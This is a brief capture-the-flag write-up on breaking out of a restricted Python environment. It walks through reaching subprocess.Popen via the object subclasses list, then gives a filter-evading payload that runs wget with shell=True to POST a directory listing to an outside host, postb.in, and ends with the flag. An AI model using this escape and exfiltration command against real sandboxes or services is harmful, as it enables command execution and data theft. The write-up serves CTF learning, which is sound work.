# Python learning environment

## Limitations

Entering the page, we can see that multiple limitations are imposed, like no integers, no ```[]```, no ```func_code``` and stuff.

## Google-fu

Googling how to escape pyjails we see:

```python
x = ().__class__.__base__.__subclasses__()
```

Executing this gives us all imported modules, and we can see subprocess.Popen in there

### Popen

```
x = ().__class__.__base__.__subclasses__()
for p in x:
    if p.__name__ == "Popen":
        print p
```

We can get the Popen method like this. Now we just need to craft the payload

## Payload

The payload I used what to retrieve the files in current directory and then POST it to postb.in:

```
p(" ".join(('wget,https://po'+'stb.in/vKvqSQcp/,--po'+'st-data,"a=$(ls)"').split(',')), shell=c)
```

## Flag

```
F#{PyTh0n_Pr1s0n_br3aK}
```

